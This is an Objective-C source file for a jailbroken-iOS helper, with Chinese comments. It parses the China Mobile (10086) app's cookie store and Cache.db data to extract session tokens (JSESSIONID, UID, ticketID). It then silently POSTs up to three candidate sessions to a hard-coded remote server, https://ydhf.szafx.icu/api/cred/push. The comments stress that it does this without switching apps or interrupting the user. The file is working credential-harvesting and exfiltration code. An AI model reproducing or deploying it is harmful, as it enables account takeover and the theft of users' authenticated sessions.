// credpush-helper —— 让 creddaemon 自己把会话推到面板（不切 App、不打断用户）
//
// 由 creddaemon.sh 调用：
//     credpush-helper --container <中国移动容器路径> --id <容器id> [--dry] [--server URL] [--token-file 路径]
// 退出码 0 = 推送成功（daemon 本轮不再 uiopen）；非 0 = 失败（daemon 回退 uiopen）。
//
// 为什么用 ObjC 而不是 Go：Go 交叉编译出来的是 macOS 平台的 Mach-O，iOS 直接拒绝加载
// （dyld: Library not loaded: /usr/lib/libSystem.B.dylib ... wrong platform）。
// 走 Theos TOOL 与 CredHUD 同一条构建链，平台/签名都是对的。
//
// 做的事：
//   1. 解析 <container>/Library/Cookies/Cookies.binarycookies（结构化，带创建时间）
//   2. ★ 2026-11-15：再从 **stdin 的混合数据**（binarycookies + Cache.db-wal/Cache.db 尾部）
//      里按文本提取 JSESSIONID/UID/ticketID/Comment —— 实测容器的 binarycookies 里
//      根本没有 10086 的会话（只有 cmicapm 两条），会话全在 Cache.db 里。
//      旧版只解析 binarycookies，所以直推永远报「会话不完整」、只能回退拉起 App。
//   3. 多条候选**一次带上**（服务端逐条试、第一条成功即停），按新→旧排序
//   4. POST <server>/api/cred/push（带 X-Cred-Token）
//
// 安装位置：/var/jb/usr/libexec/credpush-helper（不要 /usr/local/bin —— roothide 会注入）

#import <Foundation/Foundation.h>

static NSString *CStr(NSData *rec, uint32_t off) {
    if (off == 0 || off >= rec.length) return @"";
    const uint8_t *p = rec.bytes;
    NSUInteger i = off;
    while (i < rec.length && p[i] != 0) i++;
    if (i <= off) return @"";
    return [[NSString alloc] initWithBytes:p + off length:(i - off) encoding:NSUTF8StringEncoding] ?: @"";
}

static uint32_t BE32(const uint8_t *p) {
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}
static uint32_t LE32(const uint8_t *p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

// 返回 [{name, value, created}]，只看 10086 域
static NSArray<NSDictionary *> *ParseCookies(NSData *d) {
    NSMutableArray<NSDictionary *> *out = [NSMutableArray array];
    if (d.length < 8) return out;
    const uint8_t *b = d.bytes;
    if (memcmp(b, "cook", 4) != 0) return out;
    uint32_t npages = BE32(b + 4);
    if (npages == 0 || npages > 1000) return out;
    NSUInteger off = 8;
    NSMutableArray<NSNumber *> *sizes = [NSMutableArray array];
    for (uint32_t i = 0; i < npages; i++) {
        if (off + 4 > d.length) return out;
        [sizes addObject:@(BE32(b + off))];
        off += 4;
    }
    for (NSNumber *szN in sizes) {
        NSUInteger sz = szN.unsignedIntegerValue;
        if (sz == 0 || off + sz > d.length) break;
        NSData *page = [d subdataWithRange:NSMakeRange(off, sz)];
        off += sz;
        if (page.length < 8) continue;
        const uint8_t *pg = page.bytes;
        uint32_t cnt = LE32(pg + 4);
        for (uint32_t i = 0; i < cnt; i++) {
            NSUInteger p = 8 + 4 * i;
            if (p + 4 > page.length) break;
            uint32_t co = LE32(pg + p);
            if (co + 56 > page.length) continue;
            NSData *rec = [page subdataWithRange:NSMakeRange(co, page.length - co)];
            if (rec.length < 56) continue;
            const uint8_t *r = rec.bytes;
            uint32_t recSize = LE32(r);
            if (recSize > rec.length) recSize = (uint32_t)rec.length;
            rec = [rec subdataWithRange:NSMakeRange(0, recSize)];
            r = rec.bytes;
            if (rec.length < 56) continue;
            uint32_t doff = LE32(r + 16), noff = LE32(r + 20), voff = LE32(r + 28);
            double created = 0;
            memcpy(&created, r + 48, 8);
            NSString *dom = CStr(rec, doff);
            if (![dom containsString:@"10086"]) continue;
            [out addObject:@{@"name": CStr(rec, noff), @"value": CStr(rec, voff),
                             @"created": @(created)}];
        }
    }
    return out;
}

static NSDictionary *Newest(NSArray<NSDictionary *> *cs, NSString *name) {
    NSDictionary *best = nil;
    for (NSDictionary *c in cs) {
        if (![c[@"name"] isEqualToString:name]) continue;
        if ([c[@"value"] length] == 0) continue;
        if (!best || [c[@"created"] doubleValue] >= [best[@"created"] doubleValue]) best = c;
    }
    return best;
}

// ---- 从混合数据里按文本找 `name=value`（取离 center 最近的一处）----
static NSString *NearestField(NSString *win, NSUInteger center, NSString *name) {
    NSString *pat = [NSString stringWithFormat:@"\\b%@=([^;,&\\s\"'<>\\\\]+)", name];
    NSRegularExpression *re = [NSRegularExpression regularExpressionWithPattern:pat options:0 error:nil];
    if (!re) return nil;
    __block NSUInteger bestDist = NSUIntegerMax;
    __block NSRange best = NSMakeRange(NSNotFound, 0);
    [re enumerateMatchesInString:win options:0 range:NSMakeRange(0, win.length)
                      usingBlock:^(NSTextCheckingResult *m, NSMatchingFlags f, BOOL *stop) {
        if (m.numberOfRanges < 2) return;
        NSRange r = [m rangeAtIndex:1];
        NSUInteger loc = m.range.location;
        NSUInteger dist = (loc > center) ? (loc - center) : (center - loc);
        if (dist < bestDist) { bestDist = dist; best = r; }
    }];
    if (best.location == NSNotFound) return nil;
    return [win substringWithRange:best];
}

// 返回 [{sid, uid, tick, comm, pos}] —— 从 Cache.db 的 Cookie 头里抠会话
static NSArray<NSDictionary *> *ParseTextSessions(NSData *d) {
    NSMutableArray<NSDictionary *> *cand = [NSMutableArray array];
    if (d.length == 0) return cand;
    NSString *hay = [[NSString alloc] initWithData:d encoding:NSISOLatin1StringEncoding];
    if (hay.length == 0) return cand;
    NSString *sidPat = @"JSESSIONID=([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})";
    NSRegularExpression *re = [NSRegularExpression regularExpressionWithPattern:sidPat options:0 error:nil];
    if (!re) return cand;
    NSMutableSet<NSString *> *seen = [NSMutableSet set];
    NSMutableDictionary<NSString *, NSNumber *> *counts = [NSMutableDictionary dictionary];
    for (NSTextCheckingResult *m in [re matchesInString:hay options:0 range:NSMakeRange(0, hay.length)]) {
        NSString *sidAll = [hay substringWithRange:[m rangeAtIndex:1]];
        counts[sidAll] = @([counts[sidAll] integerValue] + 1);
    }
    for (NSTextCheckingResult *m in [re matchesInString:hay options:0 range:NSMakeRange(0, hay.length)]) {
        NSString *sid = [hay substringWithRange:[m rangeAtIndex:1]];
        if ([seen containsObject:sid]) continue;
        NSUInteger center = m.range.location;
        NSUInteger from = (center > 4000) ? (center - 4000) : 0;
        NSUInteger to = MIN(hay.length, center + 1200);
        NSString *win = [hay substringWithRange:NSMakeRange(from, to - from)];
        NSUInteger wc = center - from;
        NSString *uid  = NearestField(win, wc, @"UID");
        NSString *tick = NearestField(win, wc, @"ticketID") ?: NearestField(win, wc, @"ticketId");
        NSString *comm = NearestField(win, wc, @"Comment");
        if (uid.length == 0) continue;      // 没 UID 的组不完整，跳过
        [seen addObject:sid];
        [cand addObject:@{@"sid": sid, @"uid": uid,
                          @"tick": tick ?: @"", @"comm": comm ?: @"SessionServer-unity",
                          @"pos": @(center),
                          @"n": counts[sid] ?: @(0)}];
    }
    // 排序：① **出现次数降序** —— 实测活跃会话被反复使用（180 的主会话出现 118 次，
    //          旁边的僵尸会话只有 1 次），次数是最可靠的新鲜度信号；
    //       ② 同次数再按文件位置降序（越靠后越新）。
    //   服务端会逐条试、第一条成功即停，所以排第二的有效会话也能被用到。
    [cand sortUsingComparator:^NSComparisonResult(NSDictionary *a, NSDictionary *b) {
        NSInteger an = [a[@"n"] integerValue], bn = [b[@"n"] integerValue];
        if (an != bn) return (an > bn) ? NSOrderedAscending : NSOrderedDescending;
        return [b[@"pos"] compare:a[@"pos"]];
    }];
    return cand;
}

int main(int argc, const char *argv[]) {
    @autoreleasepool {
        NSString *container = nil, *cid = @"", *server = @"", *tokenFile = nil;
        BOOL dry = NO, useStdin = NO;
        for (int i = 1; i < argc; i++) {
            NSString *a = [NSString stringWithUTF8String:argv[i]];
            if ([a isEqualToString:@"--container"] && i + 1 < argc) container = [NSString stringWithUTF8String:argv[++i]];
            else if ([a isEqualToString:@"--id"] && i + 1 < argc) cid = [NSString stringWithUTF8String:argv[++i]];
            else if ([a isEqualToString:@"--server"] && i + 1 < argc) server = [NSString stringWithUTF8String:argv[++i]];
            else if ([a isEqualToString:@"--token-file"] && i + 1 < argc) tokenFile = [NSString stringWithUTF8String:argv[++i]];
            else if ([a isEqualToString:@"--dry"]) dry = YES;
            else if ([a isEqualToString:@"--stdin"]) useStdin = YES;
        }
        if (server.length == 0) server = NSProcessInfo.processInfo.environment[@"CREDD_PUSH_URL"];
        if (server.length == 0) server = @"https://ydhf.szafx.icu";
        while ([server hasSuffix:@"/"]) server = [server substringToIndex:server.length - 1];
        if (tokenFile.length == 0) tokenFile = @"/var/mobile/Library/CredDaemon/cred_push.token";
        NSData *d = nil;
        if (useStdin) {
            // ★ 2026-11-14：这个 Theos TOOL 进程读不了文件系统（NSData 读任何路径都是 nil，
            //   连 /var/mobile/Documents 下的副本也不行），而 daemon（bash/root）读没问题。
            //   所以由 daemon 把 Cookies.binarycookies 从 stdin 喂进来，这里只解析。
            d = [[NSFileHandle fileHandleWithStandardInput] readDataToEndOfFile];
            if (d.length == 0) { printf("stdin 没有数据\n"); return 3; }
        } else {
            if (container.length == 0) { printf("缺 --container\n"); return 2; }
            NSString *cf = [container stringByAppendingPathComponent:@"Library/Cookies/Cookies.binarycookies"];
            d = [NSData dataWithContentsOfFile:cf];
            if (!d) { printf("读不到 cookies: %s\n", cf.UTF8String); return 3; }
        }

        // ---- ① 文本候选（Cache.db 里的 Cookie 头，最新在前）----
        NSMutableArray<NSString *> *sessions = [NSMutableArray array];
        NSMutableSet<NSString *> *seenSid = [NSMutableSet set];
        NSArray<NSDictionary *> *textCand = ParseTextSessions(d);
        for (NSDictionary *c in textCand) {
            NSString *sidv = c[@"sid"];
            if ([seenSid containsObject:sidv]) continue;
            [seenSid addObject:sidv];
            [sessions addObject:[NSString stringWithFormat:
                @"JSESSIONID=%@; UID=%@; Comment=%@; ticketID=%@;",
                sidv, c[@"uid"], c[@"comm"], c[@"tick"]]];
            if (sessions.count >= 3) break;      // 服务端最多试 3 条
        }
        printf("文本候选 %lu 条\n", (unsigned long)textCand.count);

        // ---- ② binarycookies 候选（有 10086 会话的容器才用得上）----
        NSArray<NSDictionary *> *cs = ParseCookies(d);
        NSDictionary *bsid = Newest(cs, @"JSESSIONID");
        NSDictionary *buid = Newest(cs, @"UID");
        NSDictionary *btick = Newest(cs, @"ticketID");
        NSDictionary *bcomm = Newest(cs, @"Comment");
        if (bsid && buid && btick && ![seenSid containsObject:bsid[@"value"]] && sessions.count < 3) {
            [sessions addObject:[NSString stringWithFormat:
                @"JSESSIONID=%@; UID=%@; Comment=%@; ticketID=%@;",
                bsid[@"value"], buid[@"value"],
                bcomm[@"value"] ?: @"SessionServer-unity", btick[@"value"]]];
        }
        if (sessions.count == 0) {
            printf("会话不完整（文本 %lu 条 / binarycookies sid=%d uid=%d ticket=%d）\n",
                   (unsigned long)textCand.count, bsid != nil, buid != nil, btick != nil);
            return 4;
        }
        printf("容器=%s 候选 %lu 条：\n",
               [[cid substringToIndex:MIN((NSUInteger)8, cid.length)] UTF8String],
               (unsigned long)sessions.count);
        for (NSString *x in sessions) printf("  %.64s…\n", [x UTF8String]);
        NSString *sess = sessions[0];

        // 令牌：环境变量优先（daemon 读文件后传进来），其次才读文件
        NSString *token = [(NSProcessInfo.processInfo.environment[@"CREDD_TOKEN"] ?: @"")
                           stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
        if (token.length == 0) {
            token = [[NSString stringWithContentsOfFile:tokenFile encoding:NSUTF8StringEncoding error:nil]
                     stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
        }
        if (token.length == 0 && !dry) { printf("没有推送令牌: %s\n", tokenFile.UTF8String); return 5; }

        if (dry) {
            printf("DRY 会推: %.24s… -> %s/api/cred/push\n", [sess UTF8String], server.UTF8String);
            return 0;
        }

        NSData *body = [NSJSONSerialization dataWithJSONObject:@{@"sessions": sessions} options:0 error:nil];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:
                                    [NSURL URLWithString:[server stringByAppendingString:@"/api/cred/push"]]];
        req.HTTPMethod = @"POST";
        [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
        [req setValue:token forHTTPHeaderField:@"X-Cred-Token"];
        req.HTTPBody = body;
        req.timeoutInterval = 25;

        __block NSData *respData = nil;
        __block NSInteger status = 0;
        __block NSError *err = nil;
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req
            completionHandler:^(NSData *data, NSURLResponse *resp, NSError *e) {
                respData = data; err = e;
                status = [(NSHTTPURLResponse *)resp statusCode];
                dispatch_semaphore_signal(sem);
            }];
        [task resume];
        dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(28 * NSEC_PER_SEC)));

        if (err || status != 200) {
            printf("推送失败: HTTP %ld %s\n", (long)status, err.localizedDescription.UTF8String ?: "");
            return 6;
        }
        NSDictionary *resp = respData ? [NSJSONSerialization JSONObjectWithData:respData options:0 error:nil] : nil;
        printf("HTTP 200 %.300s\n", [[[NSString alloc] initWithData:respData encoding:NSUTF8StringEncoding] UTF8String] ?: "");
        if (![resp isKindOfClass:[NSDictionary class]] || ![resp[@"ok"] boolValue]) return 7;
        for (NSDictionary *it in resp[@"items"] ?: @[]) {
            if ([it[@"ok"] boolValue]) { printf("✓ 推送成功\n"); return 0; }
        }
        printf("服务端没有接受这条会话\n");
        return 8;
    }
}
